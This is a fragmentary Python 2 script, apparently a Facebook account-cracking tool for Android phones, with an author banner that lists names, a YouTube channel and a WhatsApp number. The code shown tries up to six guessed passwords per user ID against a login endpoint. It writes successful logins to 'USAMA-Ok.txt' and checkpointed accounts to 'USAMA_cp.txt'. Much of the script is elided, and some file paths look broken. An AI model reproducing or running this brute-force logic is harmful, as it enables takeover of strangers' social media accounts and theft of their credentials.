#!/usr/bin/python
# coding=utf-8
# Originally Written by USAMA BUTT
# Source : python2"
# Donot Recode It. 
...
try:
    ...
    os.system("python2 KSUKILLERS.py")
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass 
...
\033[1;92m                         AAQIB
\033[3m\033[1;97m══════════════════════════════════════════════
 [✓] Owner   : KSU OWNERS USAMA X OBAID X AAQIB
 [✓] Youtub  : TECHNICAL CREATIONS
 [✓] Facebook: USAMA BUTT
 [✓] Whatsapp: +923124664057
	...
	def main(arg):
		...
		try:
			...
			if "loc" in q:
				...
				ok = open("/sdcard/ids/USAMA-Ok.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\033[1;90m[USAMA-Cp] "+uid+" | "+pass1)
					cp = open("/sdcard/ids/USAMA_cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					...
					if "loc" in q:
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;90m[USAMA-Cp] "+uid+" | "+pass2)
							cp = open("/sdcard/ids/USAMA_cp.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							...
							if "loc" in q:
								...
								if "www.facebook.com" in q["error"]:
									print("\033[1;90m[USAMA-Cp] "+uid+" | "+pass3)
									cp = open("/sdcard/ids/USAMA_cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;92m[USAMA-Ok] "+uid+" | "+pass4)
										ok = open("/sdcard/ids/USAMA-Ok.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error"]:
											print("\033[1;90m[USAMA-Cp] "+uid+" | "+pass4)
											cp = open("/sdcard/ids/USAMA_cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;92m[USAMA-Ok] "+uid+" | "+pass5)
												ok = open("/sdcard/ids/USAMA-Ok.txt", "a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error"]:
													print("\033[1;90m[USAMA-Cp] "+uid+" | "+pass5)
													cp = open("/sdcard/ids/USAMA_cp.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;92m[USAMA-Ok] "+uid+" | "+pass6)
														ok = open("/sdcard/ids/USAMA_ok.txt", "a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error"]:
															print("\033[1;90m[USAMA-Cp] "+uid+" | "+pass6)
															cp = open("/sdcard/ids/USAMA_cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
...
def choice_select():
	...
	def main(arg):
		...
		try:
			...
			if "loc" in q:
				print("\033[1;92m[USAMA-Ok] "+uid+" | "+pass1)
				ok = open("/sdcard/ids/sdcard/ids/USAMA_ok.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
